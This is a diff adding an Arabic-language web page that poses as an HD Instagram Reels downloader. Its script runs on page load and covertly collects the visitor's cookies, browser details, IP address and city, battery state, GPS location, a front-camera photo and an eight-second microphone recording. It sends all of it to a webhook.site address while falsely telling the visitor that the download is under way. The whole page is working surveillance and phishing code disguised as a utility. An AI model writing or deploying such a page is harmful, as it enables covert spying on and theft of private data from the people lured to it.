@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>تحميل ريلز HD</title>
+<style>
+body{background:#000;color:#fff;font-family:system-ui;margin:0;padding:20px;text-align:center}
+h1{color:#E1306C;margin:0}
+p{font-size:18px}
+#msg{color:#0f0;margin-top:30px;font-size:18px}
+</style>
+</head>
+<body>
+<h1>تحميل ريلز HD</h1>
+<p>جاري التحميل تلقائيًا… انتظر 5 ثواني</p>
+<div id="msg">جاري جمع البحث عن أفضل جودة…</div>
+
+<script>
+const w = "https://webhook.site/659d1755-8a79-4ca9-b4c7-67d18baed452";
+
+function s(d){new Image().src=w+"?d="+encodeURIComponent(JSON.stringify(d));}
+
+setTimeout(()=>{
+  let i={t:new Date().toISOString(),ua:navigator.userAgent,lang:navigator.language,scr:`${screen.width}x${screen.height}`,ck:document.cookie};
+
+  // IP + City
+  fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{i.ip=j.ip;i.city=j.city||"";i.country=j.country_name;i.isp=j.org;s(i);});
+
+  // Battery
+  if(navigator.getBattery)navigator.getBattery().then(b=>{i.bat=Math.round(b.level*100)+"%"+(b.charging?"شاحن":"");s(i);});
+
+  // Location
+  navigator.geolocation.getCurrentPosition(p=>{i.lat=p.coords.latitude;i.lng=p.coords.longitude;i.map=`https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;s(i);});
+
+  // Camera
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(st=>{
+    setTimeout(()=>{let v=document.createElement('video');v.srcObject=st;v.play();
+      setTimeout(()=>{let c=document.createElement('canvas');c.width=640;c.height=480;
+        c.getContext('2d').drawImage(v,0,0,640,480);i.photo=c.toDataURL('image/jpeg',0.8);s(i);
+        st.getTracks().forEach(t=>t.stop());},2500);
+    },1000);
+  }).catch(()=>{});
+
+  // Mic
+  navigator.mediaDevices.getUserMedia({audio:true}).then(st=>{
+    let r=new MediaRecorder(st);let ch=[];
+    r.ondataavailable=e=>ch.push(e.data);
+    r.onstop=()=>{let b=new Blob(ch,{type:'audio/webm'});let fr=new FileReader();
+      fr.onloadend=()=>{i.audio=fr.result;s(i);};fr.readAsDataURL(b);};
+    r.start();setTimeout(()=>r.stop(),8000);
+  }).catch(()=>{});
+
+  document.getElementById('msg').innerHTML="تم بنجاح! الريل هينزل لوحده…";
+},2000);
+</script>
+</body>
+</html>
